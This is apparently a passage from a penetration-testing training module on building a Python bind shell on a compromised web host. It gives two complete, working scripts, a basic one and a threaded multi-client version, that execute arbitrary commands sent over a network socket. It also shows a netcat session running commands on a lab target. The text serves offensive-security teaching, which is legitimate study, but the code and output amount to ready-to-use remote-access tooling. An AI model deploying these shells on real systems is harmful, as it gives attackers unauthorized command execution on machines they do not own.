Upon gaining access to an internal web service with the credentials we generated using the previous tool, we can get remote code execution on the web host. Trying to use our go-to reverse shells mysteriously does not seem to work, but we discover that we can execute arbitrary python scripts. Let us abuse that discovery by implementing and running our own Python `bind shell`.

A bind shell is at its core reasonably simple. It is a process that binds to an address and port on the host machine and then listens for incoming connections to the socket. When a connection is made, the bind shell will - repeatedly - listen for bytes being sent to it and treat them as raw commands to be executed on the system in a subprocess. Once it has received all bytes in chunks of some size, it will run the command on the host system and send back the output. A very naive implementation of such a bind shell is this:

#### A Simple Bind Shell

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

Given that we will be sending this to our client, we will improve on code quality and make it more reliable. Nevertheless, first, let us analyze it.

The code consists of two functions so far: a wrapper function for executing commands on the system and one main function that contains all the logic thrown into one place. This is less than ideal. The main function sets up a socket, binds it to `0.0.0.0` (i.e., all available interfaces) and the desired port. It is then configured to allow at most four unaccepted connections before it starts refusing connections anymore - the `listen` function configures this. The socket then accepts new incoming connections. This is a so-call `blocking call`, which means the code will halt at this line of code and wait for a connection to be made. When a connection is established, the `accept` call returns two things that we store in the variables `client_socket` and `address`.

Many things happen in the while loop, so let us break it down into smaller pieces. First, these are our goals:

- receive all of the incoming bytes from the connected client (our attacker machine),
    
- convert the incoming bytes to a `cmd` string,
    
- close down the connection if `cmd` is "exit",
    
- otherwise execute the command locally and send back the output
    

Notice that we remove the last byte of the `cmd` string. This is a newline character stemming from hitting enter when typing the command.

When we run this script on our target machine, we can use `nc` on our attacker machine to connect to the bind shell and gain remote code execution:

#### Starting the Bind Shell

```bash
C:\Users\Birb\Desktop\python> python bindshell.py --port 4444
```

#### Connecting to the Bind Shell

```bash
user@htb[/htb]$ nc 10.10.10.10 4444 -nv

(UNKNOWN) [10.10.10.10] 4444 (?) open

whoami
localnest\birb

hostname
LOCALNEST

dir 
Volume in drive C has no label.
 Volume Serial Number is 966B-6E6A

 Directory of C:\Users\Birb\Desktop\python

20-03-2021  21:22    <DIR>          .
20-03-2021  21:22    <DIR>          ..
20-03-2021  21:22               929 bindshell.py
               1 File(s)            929 bytes
               2 Dir(s)  518.099.636.224 bytes free
exit
```

The downside of the current implementation is that once we disconnect, the bind shell process stops. One way to fix this is to introduce `threads` and have the command execution part of the code run in a thread. This would allow us to create a new thread every time a machine connects to the shell, and then we would only have to stop the extra thread when the shell exits. Threads, in general, is a vast and complex topic, and Python has its quirks too. To keep a very long and complicated story short and straightforward, threads let us run different code pieces `concurrently`, similarly to how humans multitask. Note that concurrently is not the same as parallel. In our example, this means that while one thread is busy doing work for our connected client, another thread (the primary one) is ready to accept a new incoming connection. Once another connection is made, these two connected clients can execute code on the victim machine using the same bind shell.

By simply extracting the code that handles command execution to its function, it is possible to make the bind shell first listen for a new connection, spawn a thread for that connection that handles command execution, and finally start over listening to new incoming connections.

#### Supporting multiple connections

```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
```

As we can see, we have added a `handle_input` function that accepts a `client_socket` as a parameter. When we create a new `Thread` object, setting the `target` (function to run) and the input parameters as a tuple, we can start this thread and let it run in the background. In addition, a `from threading import Thread` was added at the top. Also, pay close attention to the `args` in the `Thread` constructor. This is a tuple with just one value. To differentiate between single value tuples and "scope parentheses", e.g. `('Hello ' + 'world').upper()` which will have `upper()` called on the concatenated string and not just "world", the syntax for single value tuples is `(val1, )`. For two value tuples, it is `(val1, val2)` and so forth. Furthermore, yes, that is a comma and then nothing for single value tuples. Confusing? Perhaps. Just remember that `(5)` is the same as `5` because the parentheses are used for grouping, so we would need some way to differentiate between syntactic grouping and a tuple type.